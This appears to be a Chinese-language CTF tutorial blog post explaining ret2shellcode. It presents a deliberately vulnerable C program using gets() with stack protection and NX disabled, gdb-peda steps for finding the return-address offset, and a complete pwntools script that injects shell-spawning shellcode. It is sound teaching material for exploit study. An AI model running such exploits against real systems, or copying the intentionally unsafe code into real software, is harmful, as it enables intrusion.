---
title: ret2shellcode攻击技术示例
time: 2017-08-03
tags: [CTF, pwn, stackoverflow]
layout: post
categories: posts
---

# 什么是ret2shellcode？

ret2shellcode 即 return to shellcode，跟ret2text类似，但是众所周知，在大多数程序中并没有像system("/bin/sh")这样可以直接利用的代码，因此，在没有可以直接利用的代码片段时，我们可以尝试输入一段shellcode，然后向返回地址写入shellcode地址，那么当程序返回时，就可以跳转到shellcode继续执行。

由于shellcode是在buf缓冲区里被执行，因此我们需要保证程序没有开启NX(No executable)保护，我们可以在gcc编译时添加*-z execstack*选项来关闭该保护。

# ret2shellcode示例代码

``` c
//gcc -m32 -fno-stack-protector -z execstack ret2shellcode.c -o ret2shellcode
#include <stdio.h>
#include <string.h>

char buf2[100];

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("No system for you this time !!!\n");
    gets(buf);
    strncpy(buf2, buf, 100);
    printf("bye bye ~");

    return 0;
}
```

本节示例的漏洞程序也可以从此处下载：[ret2shellcode](/files/ret2shellcode)

# 漏洞分析

如源码所示，这次程序依旧使用了不安全的函数gets()接受用户输入。另外在pwntools中已经为我们提供了可用的shellcode，如下：
``` python
shellcode = asm(shellcraft.sh())
```

我的利用方法也和ret2text类似，不过这次我们需要修改的返回地址变成了shellcode的地址，而这次定位返回地址，我们换个花样 :）

首先用gdb挂起程序后，我们使用peda的辅助功能pattern_create生成一系列的字符串，然后将其输入进buf中，因为过长的字符串会导致程序栈溢出，函数会停在返回地址处报错（因为访问了一个错误的地址），因此我们就可以直观地知道返回地址被哪个地方的哪个字符串覆盖了，从而知道buf首地址到返回地址之间的偏移。

``` bash
gdb-peda$ pattern_create 120
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
```
因为buf是100，因此我生成了长120的字符串保证栈溢出。接下来我们运行程序后输入这串字符

``` bash
gdb-peda$ run
Starting program: /home/vancir/Downloads/example/ret2shellcode/ret2shellcode
No system for you this time !!!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
bye bye ~
Program received signal SIGSEGV, Segmentation fault.
```
这里我们输入了过长字符串，因此程序提示Segmentation fault，这时我们再看程序的EIP
``` bash
EIP: 0x41384141 ('AA8A')
```
这时的EIP的值为0x41384141，也就是在返回地址上，因为访问了一个错误的地址，所以停了下来。这时我们只需要查询0x41384141('AA8A')在我们之前生成的串中的偏移

``` bash
gdb-peda$ pattern_offset  0x41384141
1094205761 found at offset: 112
```
得到偏移为112

接下来我们再得到buf的首地址(因为我们的shellcode会先输入到buf中执行)，调试的时候在gets(buf)的传参时候可以得到buf的地址，因此我们可以很简单地知道buf的地址为*0x804a080*。

那么我们进行攻击所需要的所有要素都已经收集完成啦

# 攻击代码

``` python
from pwn import *

shellcode = asm(shellcraft.sh())
buf_addr = 0x804a080

payload = ''
payload += shellcode.ljust(112,'A')
payload += p32(buf_addr)

io = process('ret2shellcode')
io.sendline(payload)
io.interactive()
```
